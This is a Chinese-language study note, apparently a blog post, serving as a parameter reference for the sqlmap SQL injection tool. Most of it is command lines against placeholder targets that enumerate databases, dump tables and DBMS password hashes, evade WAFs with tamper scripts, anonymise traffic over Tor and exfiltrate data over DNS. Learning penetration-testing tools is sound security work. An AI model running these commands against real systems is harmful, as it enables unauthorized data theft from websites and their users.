---
layout:     post
title:     工具（一）sqlmap
subtitle:   这个系列是安全相关工具的介绍、参数使用、常用指令等等用法心得体会，有些常用的工具会记得比较细。本章是sqlmap笔记。
date:       2020-12-06
author:     HouKC
header-img: img/home-bg-o.jpg
catalog:    true
tags:
    - 工具
    - web
    - 网络安全
    - 学习笔记
    - SQL注入
---



## 0x00 常用指令

- SQL注入测试，并且按照默认自动完成用户交互。

```
sqlmap -u "http://xxx.com/xxx.php?id=1" --batch 
```

- 获取当前数据库

```
sqlmap -u "http://xxx.com/xxx.php?id=1" --batch --current-db
```

- 获取所有数据库

```
sqlmap -u "http://xxx.com/xxx.php?id=1" --batch --dbs
```

- 指定数据库类型为MySQL，获取表名

```
sqlmap -u "http://xxx.com/xxx.php?id=1" --batch --dbms "MySQL" -D [数据库名] --tables
```

- 指定库名、表名，获取列名

```
sqlmap -u "http://xxx.com/xxx.php?id=1" --batch --dbms "MySQL" -D [数据库名] -T [表名] --columns
```

- 指定库名、表名、列名，获取数据

```
sqlmap -u "http://xxx.com/xxx.php?id=1" --batch --dbms "MySQL" -D [数据库名] -T [表名] -C "[列名1],[列名2]" --dump
```

- 将HTTP请求内容保存在request.txt文件中，从文件打开，指定使用布尔、时间盲注进行测试

```
sqlmap -r request.txt --batch --current-db --technique BT
```

- 使用最高级别的Payload测试，并且使用一些更具风险（可能影响网站）的Payload，开启线程最大，即10个线程进行测试

```
sqlmap -u "http://xxx.com/xxx.php?id=1" --batch --current-db --level 5 --risk 3 --threads 10
```

- 枚举所有除了系统数据库之外的库名、表名、列名及其类型信息

```
sqlmap -u "http://xxx.com/xxx.php?id=1" --schema --exclude-sysdbs --batch
```



## 0x01 --technique

sqlmap设置具体SQL注入技术

- --technique T   指明基于时间的盲注（Time-based blind）
- --technique B   指定基于布尔的盲注（Boolean-based blind）
- --technique E   指定报错注入（Error-based）
- --technique U  指定Union查询注入（Union query-based）
- --technique S   指定堆叠注入（Stacked queries）
- --technique Q  指定内联查询注入（Inline queries）
- --technique BT  指定基于时间和布尔（其实就是叠加使用，其他同理）



## 0x02 --hex

对注入的参数进行十六进制编码。

```
sqlmap -u "http://xxx.com/xxx.php?id=1" --hex
```



## 0x03 --search

可以搜索数据库名，在所有数据库中搜索表名，在所有数据库的所有表中搜索列名。

参数“–search”要和下列参数之一配合使用：

- -C：后跟以逗号分隔的列名，在整个数据库管理系统中搜索
- -T：后跟以逗号分隔的表名，在整个数据库管理系统中搜索
- -D：后跟以逗号分隔的库名，在整个数据库管理系统中搜索

在搜索时，Sqlmap会询问用户进行精确搜索还是包含搜索。

默认为包含搜索，即搜索的字符串包含于结果中就认为命中。

精确搜索要求搜索的字符串与结果完全相等。

```
sqlmap -u "http://xxx.com/xxx.php?id=1" --batch --search -D [库名]
```



## 0x04 --version

查看版本信息

```
sqlmap --version
```



## 0x05 -d

直连数据库。

#### 1. 服务型数据库（前提直到数据库用户名和密码）

DBMS://USER:PASSWORD@DBMS_IP:DBMS_PORT/DATABASE_NAME(MySQL, Oracle, Microsoft SQL Server, PostgreSQL, etc.)

例如：

```
sqlmap -d "mysql://admin:admin@192.168.21.17:3306/testdb" -f --banner --dbs --users
```

#### 2. 文件型数据库（前提知道数据库绝对路径）

DBMS://DATABASE_FILEPATH(SQLite, Microsoft Access, Firebird, etc.)



## 0x06 -l、-x、-m、-r、-c、-g

从不同类型的文件中读取目标进行SQL注入探测

- -l 从Burpsuite proxy或WebScarab proxy中读取Http请求日志文件

其中日志文件需要在 Burpsuite->project options->Misc->logging，把 Proxy:Requests 勾选上去，并填写保存目录和文件名，然后`-l [该文件名]`读取请求。

- -x 从sitemap.xml站点地图文件中读取目标探测
- -m 从多行文本格式文件读取多个目标，对多个目标进行探测
- -r 从文本文件中读取http请求作为SQL注入探测的目标

其中 -r 参数常用于检测消息头中的SQL注入，如referer、cookie等。

- -c 从配置文件 sqlmap.conf中读取目标探测
- -g 利用Google获取指定Google hack的目标，然后利用交互向导模式进行SQL注入探测。

```
sqlmap -g "inurl:\".php?id=1\""
```



## 0x07 --method

指定请求方法。

sqlmap会自动在探测过程汇总使用适合的HTTP请求方法，但是在某些情况下，需要强制使用具体的HTTP请求方法，如PUT请求。

```
sqlmap -u "http://xxx.com/xxx.php?id=1" --method=PUT
```


用 --data 可以隐式地更改为POST

```
sqlmap -u "http://xxx.com/xxx.php" --data='id=1' --dbs
```



## 0x08 -f、--banner、-b
fingerprint指纹，获取指纹信息，三个都是显示目标网站数据库管理系统DBMS的指纹信息（版本）。

```
sqlmap -u "http://xxx.com/xxx.php?id=1" -f --banner -b
```



## 0x09 --data、--param-del
前者指定POST数据，后者指定分隔符。
```
sqlmap -u "http://xxx.com/xxx.php" --data="id=1&password=123" --param-del="&"
```



## 0x0a --cookie、--cookie-del、--load-cookie、--drop-set-cookie

#### 1. 用途

sqlmap用来设置cookie的参数。

- --cookie    指定cookie
- --cookie-del     指定分隔符
- --load-cookie    可以用来提供包含Netscape/wget格式的cookie特殊文件
- --drop-set-cookie     忽略任何即将到来的Set-Cookie头来避免自动测试Set-Cookie标头

#### 2. 使用场景

- Web应用程序具有基于cookie验证的过程
- 想利用cookie值上的sql注入漏洞

#### 3. sqlmap使用cookie过程

- 登录或浏览页面
- 打开审计工具或代理截断，复制cookie
- 在sqlmap中使用--cookie 粘贴cookie


注意：如果需要对Cookie进行注入，需要设置--level 2以上。



## 0x0b --random-agent、--user-agent

默认情况下，sqlmap使用以下用户代理头执行HTTP请求：sqlmap/1.0-dev-xxxxxx(http://sqlmap.org)

- --user-agent       通过提供自定义用户代理作为选项的参数
- --random-agent    sqlmap将从./txt/user-agent中随机选择一个用于会话中的所有HTTP请求

```
sqlmap -u "http://xxx.com/xxx.php?id=1" --user-agent="Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36"
```

一些站点在服务端检测HTTP User-Agent值，如果不是一个合法的值，会中断链接，同时sqlmap会报错：

```
[hh:mm:20][ERROR] the target URL responded with an unknown HTTP status code, try to force the HTTP User-Agent header with option --user-agent or --random-agent
```


另外，针对User-Agent的值探测SQL注入，需要设置--level值为3，在保存好的请求包中，在User-Agent的值最末尾添加\*，然后输入以下语句进行测试。

```
sqlmap -r target.txt --level 3
```



## 0x0c --headers、--header、-H

设置额外的HTTP头，每个标头必须用换行符分隔，从配置INI文件中提供它们要容易得多（可以查看示例，sqlmap.conf文件）。

-H等价于--header。

```
sqlmap -u "http://xxx.com/xxx.php?id=1" --header="Host:www.target.com"
sqlmap -u "http://xxx.com/xxx.php?id=1" --headers="Host:www.target.com\nUser-agent:Firefox 1.0"
```



## 0x0d --auth-type、--auth-cred
其中 --auth-type 支持Basic、Digest、NTLM，一般用Basic就行。

--auth-cred 认证语法为：username:password，在访问该系统需要手动认证输入账号密码时用到。

```
sqlmap -u "http://xxxxx" --auth-type Basic --auth-cred "testuser:testpass"
```



## 0x0e --proxy、--proxy-cred、--proxy-file、--ignore-proxy
- --proxy：用来设置HTTP代理服务器位置

```
sqlmap -u "http://xxx.com/xxx.php?id=1" --proxy http(s)://ip[:端口]
```

- --proxy-cred：用来设置HTTP代理服务器认证信息

```
sqlmap -u "http://xxx.com/xxx.php?id=1" --proxy-cred username:password
```

- --proxy-file：用来设置多条代理在文件中
- --ignore-proxy：忽略系统范围内的HTTP(s)代理服务器设置来针对本地网络的目标部分运行sqlmap时，使用此方法。



## 0x0f --tor，--tor-port，--tor-type，--check-tor
连接tor网络进行匿名访问。

要先下载安装tor，然后启动tor服务。

```
apt-get install tor
service tor start
service tor status     //查看状态
```

然后选择tor。

```
sqlmap -u "http://xxx.com/xxx.php?id=1" --tor --tor-type http --check-tor
```

其中 --tor-type 有四种：HTTP，HTTPS，SOCKS4，SOCKS5。



## 0x10 --delay
延时访问速度。

```
sqlmap -u "http://xxx.com/xxx.php?id=1" --delay 0.5	   // 延时0.5秒访问
```



## 0x11 --timeout
设置超时，在考虑超时HTTP(S)请求之前，可以指定等待的秒数，有效值是一个浮点数，默认设置为30秒。

```
sqlmap -u "http://xxx.com/xxx.php?id=1" --timeout 10.5    //等待10.5秒超时
```



## 0x12 --retries
设置重试次数，默认3次。

```
sqlmap -u "http://xxx.com/xxx.php?id=1" --retries 5    //设置重连5次
```



## 0x13 --randomize
设置随机化参数，可以指定要在每次请求期间随机更改其值的参数名称。长度和类型根据提供的原始值保持一致。默认随机化。

```
sqlmap -u "http://xxx.com/xxx.php?id=1" --randomize id
```

其中id为参数名称。



## 0x14 --scope
设置日志过滤目标。

与使用选项 -l 使用从提供的日志解析的所有主机不同，可以指定有效的python正则表达式，用于过滤所需的日志。

```
sqlmap -l burp.log --scope="(www)?\.target\.(com|net|org)"
```

过滤其他，只选中正则匹配到的链接。



## 0x15 **--skip-urlencode**

不进行URL编码。



## 0x16 --ignore-401

用来忽略未验证错误，如果想测试偶尔返回HTTP错误401（未经授权的）的站点，而你想忽略它并在不提供适当凭证的情况下继续测试，可以使用--ignore-401。



## 0x17 --auth-file
sqlmap中设置HTTP协议私钥，当web服务器需要适当的客户端证书和用于身份验证的私钥时，应该使用此选项，提供的值应该是一个PEM格式的key_file，其中包含证书和私钥。

```
sqlmap -u "http://xxx.com/xxx.php?id=1" --auth-file 文件名
```



## 0x18 --safe-url、--safe-post、--safe-req、--safe-freq
sqlmap设置安全模式，避免在多次请求失败后销毁会话。

有时，如果执行了一定数量的不成功请求，则在此期间的web应用程序或检查技术会销毁会话。可能发生在sqlmap的检测阶段或利用任何盲SQL注入类型时，原因是SQL有效负载不一定返回输出，因此可能会向应用程序会话管理或检查技术发出信号。

通过这种方式，sqlmap将访问每个预定义数量的请求，而不对某个安全URL执行任何类型的注入。也就是说会跳过安全URL对一般的URL先进行注入，最后再尝试注入安全URL。这样可以防止那些安全URL访问失败导致会话中断。

- --safe-url：提供一个安全链接，测试中每隔一段时间都会去访问。
- --safe-post：同上，但是使用POST方式提交。
- --safe-req：同上，但是从文件中加载目标。
- --safe-freq：设置每测试多少注入语句后才去访问安全链接。



## 0x19 --keep-alive
sqlmap可以设置连接为持久连接，即在HTTP报文中设置`Connection:Keep-Alive`

```
sqlmap -u "http://xxx.com/xxx.php?id=1" --keep-alive
```


这样可以减少连接次数，从而提高性能。



## 0x1a --null-connection
sqlmap中设置空连接，表示不接受HTTP当中的body，常用在盲注过程中。其实就是只检索没有body响应的请求，而不是所有请求，没有body响应的请求如HEAD请求，对端就不会返回body。

```
sqlmap -u "http://xxx.com/xxx.php?id=1" --null-connection
```



## 0x1b --threads
sqlmap中设置同时发送多少个HTTP请求的多线程，默认是1个线程，为了不影响目标站点服务器的性能，sqlmap可以设置最大的线程数为10。

```
sqlmap -u "http://xxx.com/xxx.php" --threads 10
```


通过设置多线程也可以提高sqlmap的性能。



## 0x1c --predict-output
sqlmap中的预测输出，在推理算法中用于检索值字符的顺序统计预测。

注意这个参数与 --thread 参数不兼容。

```
sqlmap -u "http://xxx.com/xxx.php" --dbs --predict-output
```


能在一定程度上提高sqlmap探测性能。



## 0x1d -o
开启所有提高性能的参数。

```
sqlmap -u "http://xxx.com/xxx.php" -o
```



## 0x1e -p、--skip、--param-exclude、--skip-static

- -p 指定具体探测的参数
- --skip 忽略探测具体的参数
- --param-exclude 忽略包含具体内容的参数
- --skip-static 忽略非动态参数

```
sqlmap -u "http://xxx.com/xxx.php" -p "id,user-agent"
sqlmap -u "http://xxx.com/xxx.php" --skip "user-agent, referer"
sqlmap -u "http://xxx.com/xxx.php" --param-exclude="token|session"    //不对包含token或session的参数进行探测。
```



## 0x1f --dbms
sqlmap DBMS指定，默认情况下会自动识别探测目标web应用程序的后端数据库管理系统（DBMS），以下列出sqlmap完全支持的DBMS种类：

- MySQL
- Oracle
- Microsoft SQL Server
- IBM DB2
- SQLite
- FIrebird
- Sybase
- SAP MaxDB
- HSQLDB
- Informix

```
sqlmap -u "http://xxx.com/xxx.php" --dbms [数据库管理系统名称] [版本号]        版本号可有可无
sqlmap -u "http://xxx.com/xxx.php" --dbms mysql 5.0
sqlmap -u "http://xxx.com/xxx.php" --dbms microsoft sql server 05    表示2005版本，08为2008版本
```



## 0x20 --os
sqlmap os指定，默认情况下自动识别目标后端操作系统（OS），sqlmap完全支持的OS种类：

- Linux
- Windows

```
sqlmap -u "http://xxx.com/xxx.php" --os windows
sqlmap -u "http://xxx.com/xxx.php" --os Linux
```



## 0x21 --no-cast

在检索结果时，sqlmap使用一种机制，在这种机制中，所有条目都被转换为字符串类型，并在NULL值的情况下用空格字符替换，这样做事为了防止出现任何错误状态（例如，将空值与字符串值连接起来），并简化数据检索过程本身。尽管如此，还是有报告的案例（例如MySQL DBMS的旧版本）由于数据检索本身的问题（例如没有返回值）需要关闭这种机制（使用此开关）。



## 0x22 --no-escape

在sqlmap需要在有效负载中使用（单引号分隔）字符串值（例如，选择'foobar'）时，这些值将自动转义（例如，选择CHAR(102)+CHAR(111)+CHAR(111)+CHAR(98)+CHAR(97)+CHAR(114)）。这样做的原因有两个：混淆有效负载内容和防止后端服务器上查询转义机制（例如magic_quotes和/或mysql_real_esacape_string）的潜在问题。用户可以使用这个开关关闭它（例如减少有效负载大小）。



## 0x23 --invalid-bignum

在sqlmap需要使原始参数值无效（例如id=13）时，它使用经典的否定（例如id=-13）。有了这个开关就可以强制使用大整数值来实现相同的目标（例如id=99999999）。

```
sqlmap -u "http://xxx.com/xxx.php?id=1" --invalid-bignum
```



## 0x24 --invalid-logical

在sqlmap需要使原始参数值无效（例如id=13）时，它使用经典的否定（例如id=-13）。有了这个开关就可以强制使用布尔操作来实现相同的目标（例如id=13 and 18=19）。

```
sqlmap -u "http://xxx.com/xxx.php?id=1" --invalid-logical
```



## 0x25 --invalid-string

在sqlmap需要使原始参数值无效（例如id=13）时，它使用经典的否定（例如id=-13）。有了这个开关就可以强制使用随机字符串来实现相同的目标（例如id=akewmc）。因为id要接收一个数值，但字符串会被识别为非数值，所以是False。

```
sqlmap -u "http://xxx.com/xxx.php?id=1" --invalid-string
```



## 0x26 --prefix、--suffix
在某些情况下，只有当用户提供要附加到注入负载的特定后缀时，易受攻击的参数才可被利用。当用户已经知道查询语法并希望通过直接提供注入有效负载前缀和后缀来检测和利用SQL注入时，这些选项就派上用场了。

- --prefix 设置SQL注入Payload前缀
- --suffix 设置SQL注入Payload后缀

假设SQL语句如下：

```php
$query = "select * from users where id=('.GET['id'].') limit 0,1";
```

用sqlmap设置前后缀后注入：

```
sqlmap -u "http://xxx?id=1" -p id --prefix "')" --suffix " and ('abc'='abc"
```

注入后的SQL语句如下：

```php
$query = "select * from users where id=('1')<PAYLOAD> and ('abc'='abc') limit 0,1";
```



## 0x27 -v

显示调试信息。

有7个级别：

- -v 0 只显示python错误以及严重的信息。

- -v 1 同时显示基本信息和警告信息。（默认）

- -v 2 同时显示debug信息。

- -v 3 同时显示每次探测的payload。

- -v 4 同时显示HTTP请求。

- -v 5 同时显示HTTP响应头。

- -v 6 同时显示HTTP响应页面。

```
sqlmap -u "http://xxx.com/xxx.php?id=1" -v3
```



## 0x28 --tamper
sqlmap本身不会混淆发送的有效负载，除了单引号之间的字符串被CHAR()类似的表示形式所取代之外。sqlmap通过Tamper脚本来绕过WAF等防御措施，可以在tamper文件夹下找到所有sqlmap自带的tamper脚本。多个脚本之间用逗号隔开。

```
sqlmap -u "http://xxx.com/xxx.php?id=1" --tamper "between.py,randomcase.py,space2comment.py"
```



## 0x29 --dbms-cred
设置DBMS认证方式，可以通过以下命令：

```
sqlmap -u "http://xxx.com/xxx.php?id=1" --dbms-cred="[username]:[password]"
```

示例：

```
sqlmap -u "http://xxx.com/xxx.php?id=1" --dbms-cred="root:123456"
```



## 0x2a --level
此选项需要制定要执行的测试等级的参数。

有五个层次，在执行有限数量的测试（请求）时，默认值为1，1~5探测复杂逐步提升。

sqlmap使用的有效负载在sqlmap/data/xml/payloads/路径下的xml中指定。按照文件顶部的说明，如果sqlmap错过了注入，你也应该能够添加自己的有效负载来进行测试。

这个选项不仅会影响到哪个有效负载sqlmap尝试，还会影响到在探测中取哪个注入点。

- --level 1 GET和POST参数测试。
- --level 2 HTTP Cookie头值从第2级测试。
- --level 3 HTTP用户代理/引用头值/User-agent/Refer等从第3级测试。
- --level 4

- --level 5 全测试。

总之，检测SQL注入越困难，必须设置的级别就越高。在显示无法注入时，可以设置 --level 5。

```
sqlmap -u "http://xxx.com/xxx.php?id=1" --level 5
```





## 0x2b --risk
此选项需要指定要执行测试的风险的参数。有三个风险值：

- --risk 1 这对于大多数SQL注入点来说是无害的。（默认）
- --risk 2 增加了大量基于查询时间的SQL注入测试的默认级别
- --risk 3 增加了基于or的SQL注入测试。

在某些情况下，比如UPDATE语句中的SQL注入，注入基于or的有效负载可能导致表的所有条目的更新，这肯定不是攻击者想要的，出于这个原因和其他原因，我们引入了这个选项，用户可以控制测试的有效负载，用户可以任意选择使用也有潜在危险的负载。
测试的语句同样可以在sqlmap/data/xml/payloads/路径下的xml中找到，可以自行添加。

```
sqlmap -u "http://xxx.com/xxx.php?id=1" --risk 3
```



## 0x2c --string、--not-string、--regexp、--code
sqlmap设置页面比较参数，默认情况下，通过比较注入的请求页面内容和未注入的原始页面内容，可以区分真查询和假查询。这种观念并不总是起作用是因为在每次刷新页面内容的变化有时甚至没有注射，例如当页面有一个计数器，一个动态广告横幅或任何其他HTML的一部分呈现动态和可能改变时间不仅因此用户的输入。

为了绕过这个限制，sqlmap努力识别响应体的这些片段并进行相应处理。

- --string 指定包含字符串，查询为True

- --not-string 指定包含字符串，查询结果为False

- --regexp 指定通过正则表达式匹配字符串，查询为True

- --code 指定匹配HTTP状态响应码，查询为True



## 0x2d --text-only、--titles
设置内容比较参数。

- --text-only  设置页面内容中包含文本。
- --titles  设置页面title中包含文本，前提需要知道如何区分查询的真与假，根据返回字符串内容不同。

```
sqlmap -u "http://xxx.com/xxx.php?id=1" --text-only="Welcome for True and Forbidden for False" --titles="Login"
```



## 0x2e --time-sec
设置时间盲注延迟时间（DBMS延时）。

在测试基于时间的盲SQL注入时，可以设置秒来延迟响应，方法是提供--time-sec选项，后面跟着一个整数。默认情况下是5秒。

```
sqlmap -u "http://xxx.com/xxx.php?id=1" --time-sec 3
```



## 0x2f --union-cols

设置union字段数，默认使用1到10列的union查询SQL注入技术，使用更高的level值可以增加到50列。

--union-cols可以手动设置特定范围列数。

```
sqlmap -u "http://xxx.com/xxx.php?id=1" --union-cols 12-18
```

表示探测的列数为12到18列。



## 0x30 --union-char
设置union字符。默认使用空字符NULL。

level更高时还将使用随机数执行测试，因为在某些情况下，union查询测试使用NULL会失败，而使用随机整数会成功。
--union-char可以手动设置特定字符测试这种类型的注入。

```
sqlmap -u "http://xxx.com/xxx.php?id=1" --union-char 123
```



## 0x31 --union-from
设置union查询表，某些情况下，sqlmap需要设定union查询SQL注入的具体数据表才可以得到数据。
--union-from 表名

```
sqlmap -u "http://xxx.com/xxx.php?id=1" --technique U --union-from users --current-db -v3
```



## 0x32 --dns-domain
设置DNS攻击。针对目标网络很有可能对外部流量进行限制，或者设置WAF。通过设置DNS流量来突破限制：

```
sqlmap -u "http://xxx.com/xxx.php?id=1" --dns-domain "dns服务器"
```


需要用户自身具有一个开放53端口的DNS服务器，通过DNS流量来获得Web应用程序中数据内容。



## 0x33 --second-order
sqlmap设置二次注入的结果页面。

```
sqlmap -u "http://xxx.com/xxx.php?id=1" --second-order="url"
```



## 0x34 --current-user
获取当前用户。

```
sqlmap -u "http://xxx.com/xxx.php?id=1" --current-user
```



## 0x35 --current-db
获取当前数据库

```
sqlmap -u "http://xxx.com/xxx.php?id=1" --current-db
```



## 0x36 --hostname
获取当前主机名

```
sqlmap -u "http://xxx.com/xxx.php?id=1"  --hostname
```



## 0x37 --is-dba

探测当前用户DBA，是否是数据库管理员。

```
sqlmap -u "http://xxx.com/xxx.php?id=1" --is-dba
```



## 0x38 --users

枚举DBMS用户，获取DBMS所有用户。

```
sqlmap -u "http://xxx.com/xxx.php?id=1" --users
```



## 0x39 --password

枚举DBMS用户密码。

```
sqlmap -u "http://xxx.com/xxx.php?id=1" --password
```



## 0x3a --privileges、--role
- --privileges 枚举DBMS权限
- --role 枚举DBMS角色

```
sqlmap -u "http://xxx.com/xxx.php?id=1" --role
```



## 0x3b --dbs、--tables、-D、--exclude-sysdbs、-T、--columns、-C、--dump
- --dbs      sqlmap列举数据库名
- --tables     列举表名
- -D     指定数据库
- --exclude-sysdbs       排除系统数据库（information_shcema等）
- -T      指定表
- --columns      列举字段名
- -C     指定列名
- --dump      枚举数据值

```
sqlmap -u "http://xxx.com/xxx.php?id=1" -D security -T users -C "username,password" --dump
```



## 0x3c --schema
枚举schema信息。用户可以使用此开关检索DBMS模式。模式列表将包含所有数据库、表和列，以及它们各自的类型。与--exclude-sysdb结合使用时，只会检索和显示包含非系统数据库的模式的一部分。

```
sqlmap -u "http://xxx.com/xxx.php?id=1" --schema --exclude-sysdbs --batch
```



## 0x3d --count
检索数据表数量，如果用户只想知道表的条目数，就可以使用这参数。

```
sqlmap -u "http://xxx.com/xxx.php?id=1" --count
```



## 0x3e --start、--stop、--first、--last
可有可无的参数。

- --start 1 --stop 3  获取第二张到第三张表的名字
- --stop 1   获取第一张表的名字
- --first 3 --last 5    获取从第三出发到第五个字符





## 0xff 加星号\*

当注入点位于URI本身内部时，会出现一些特殊情况，除非手动指向URI路径，否则sqlmap不会对URI路径执行任何自动测试。必须在命令行中添加型号（\*）来指定这些注入点。

例如：当使用Apache web服务器的mod_rewrite模块或其他类似的技术时，就特别有用。

```
sqlmap -u "http://www.target.com/param1/value1*/param2/value2/"
```

相当于指定value1处为注入点。

任意位置注入：

与URI注入点类似，星号（*）（注意：这里也支持Havij样式%INJECT %）也可以用来指向GET、POST或HTTP头中的任意注入点。注入点可以通过在带有选项 -u 的GET参数值、带有选项-数据的POST参数值、带有选项 -H 的HTTP头值、带有选项-头、用户代理、引用和/或cookie的HTTP头值中指定，或者在带有选项-r的文件中加载的HTTP请求的通用位置指定。

```
sqlmap -u "http://xxx.com/xxx.php" --cookie="param1=value1*;param2=value2"
```

